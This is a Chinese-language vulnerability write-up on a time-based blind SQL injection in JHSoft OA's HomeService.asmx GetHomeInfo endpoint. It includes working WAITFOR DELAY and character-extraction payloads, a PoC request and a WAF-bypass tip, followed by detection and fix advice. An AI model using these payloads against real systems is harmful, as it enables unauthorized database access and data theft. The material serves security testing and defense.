---
id: web-generic-sqli-jhsoft-homeservice-getuserinfo-getusersex
title: JHSoft OA HomeService.asmx GetHomeInfo 的 userID 经 GetUserSex 直拼 SQL：时间盲注
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-asmx-webmethod-string-concat-mssql-time-blind
aliases:
- JHSoft HomeService SQL注入
- 金和 OA 移动端 SQL注入
- AndroidSevices HomeService.asmx
- GetHomeInfo userID 注入
- GetUserSex 拼接注入
- ASMX WebMethod SQL 注入
tags:
- sqli
- dotnet
- asmx
- webservice
- mssql
- time-based
- oa
- jhsoft
- string-concat
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:21+08:00'
  notes: 已对照原文与 img/05-11 核对 GetHomeInfo→GetQuickUserInfo（存储过程参数化）→异常分支 GetUserSex(userID) 拼接查询，以及 302 复现请求。未验证点：GetUserSex 拼接行截图右侧被截断，文章未展示稳定延时数值/取数过程，按原文结论与上下文保留（confidence medium）。
---

## 一句话结论

JHSoft OA 移动端 `jhsoft.mobileapp/AndroidSevices/HomeService.asmx` 的 `GetHomeInfo(string userID)` WebMethod 在照片路径为空时会调用 `GetUserSex(userID)`，后者把 `userID` 直接拼进 `select DossValue from dossiervalue ... where ...` 查询；构造 `userID=';WAITFOR DELAY '0:0:5'--` 可尝试 MSSQL 时间盲注。

## 原理

- 入口是 ASMX WebService `HomeService` 的 `[WebMethod] public string GetHomeInfo(string userID)`；类上标注 `[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]`，ASMX 默认同时开放 HTTP GET/POST 调用形式，因此可直接用 `GetHomeInfo?userID=...` 访问。
- `GetHomeInfo` 先执行 `new DiaryManagePro().GetQuickUserInfo(userID)` 取用户信息，再取 `PhotoURL` 处理照片路径；当 `MapAndFindFilebyRelativeFilePath` 返回 false 时把 `text` 置空，随后进入 `if (string.IsNullOrEmpty(text)) { string userSex = GetUserSex(userID); ... }`。
- `GetUserSex(string userId)` 内部用字符串拼接构造 `select DossValue from dossiervalue a left join users b on a.RegCode=b.userid where a.DossierFileID...`，外部 `userId` 未做转义/参数化直接进入 SQL 文本，交给 `DBOperator.ExecSQLReDataTable` 执行。
- 注意同一服务中的 `GetQuickUserInfo` 走的是存储过程 `pt_GetQuickUserInfo` + `object[]` 参数（参数化），并未注入；真正的注入点是后续 `GetUserSex` 的拼接查询，这也是审计时容易漏看的地方——先经过一个“看起来安全”的参数化查询，再在异常分支里用不安全拼接兜底。
- ASMX 捕获异常后会返回 SOAP Fault 或跳转到应用错误页；文章复现请求返回 302，因此应以响应时间差（稳定增加约 5 秒）作为判定依据，不能只看状态码。

## 触发条件

- 目标部署了 `jhsoft.mobileapp` 模块，且 `AndroidSevices/HomeService.asmx` 可访问。
- ASMX 默认的 HTTP GET/POST 协议未被禁用（`<protocols><remove name="HttpGet"/>` 等未配置）。
- `GetHomeInfo` 中照片路径分支走到 `GetUserSex`（默认用户无照片或路径映射失败即可）。
- 数据库为 MSSQL，账号可执行 `WAITFOR`；时间盲注需要稳定网络。

## 利用步骤

1. 请求 `GetHomeInfo?userID=1`，记录响应时间和返回体（通常是 JSON/XML 片段或错误页）。
2. 请求 `GetHomeInfo?userID=1';WAITFOR DELAY '0:0:5'--`（URL 编码），重复 2–3 次，确认响应稳定延迟约 5 秒。
3. 确认后改用条件延时逐位提取数据，例如 `1';IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:3'--`。
4. 若服务端返回 SQL 错误信息，可改为报错注入；若 ASMX 只回 302/错误页，继续用时间盲注。

## PoC

```http
GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
Host: target.example
```

```text
# 文章截图：HTTP/1.1 302 Found（应用异常/错误跳转）
# 判定应以响应时间差为准：基线毫秒级，注入后稳定 +5s
```

## 变体与关联

- 变体：同一 `HomeService` 的其他 WebMethod 若同样把参数传入拼接 SQL 的 `GetUserSex`/`ExecSQLReDataTable` 调用，可按相同方式测试。
- 变体：ASMX 的 SOAP POST 形式（`POST /HomeService.asmx`，`SOAPAction` 指向 `GetHomeInfo`）可绕过只拦 QueryString 的 WAF。
- 关联：[[web-generic-sqli-eis-notify-asmx-loginname-xp-cmdshell]]（ASMX WebMethod 参数直拼 MSSQL，且已打通 xp_cmdshell）；[[web-generic-sqli-eis-down-aspx-i-param-mssql]]（OA 前台 MSSQL 延时注入）。
- 边界：文章只给出注入请求与 302 响应截图，未展示稳定延时数值或取数过程；`GetUserSex` 的来源行在截图中右侧被截断，按原文结论与上下文判定为拼接注入，复现前建议先确认该行完整代码。

## 检测与防御

- 检测：`HomeService.asmx` 请求的 `userID` 出现 `'`、`;`、`WAITFOR`、`--`、`IF(` 等特征；同一会话对 ASMX 的异常长耗时请求；应用日志出现 `select DossValue from dossiervalue ...` 拼接文本。
- 修复：`GetUserSex` 改用参数化查询（`@userId`），或先把 `userID` 强制转换为 GUID/int 并按用户 ID 查询；不要用字符串拼接拼接任何外部输入。
- 加固：ASMX 不需要 GET/POST 时在 `web.config` 移除 `HttpGet`/`HttpPost` 协议；WAF 对 SOAP 与 query 两种入口同时覆盖；数据库账号最小权限。
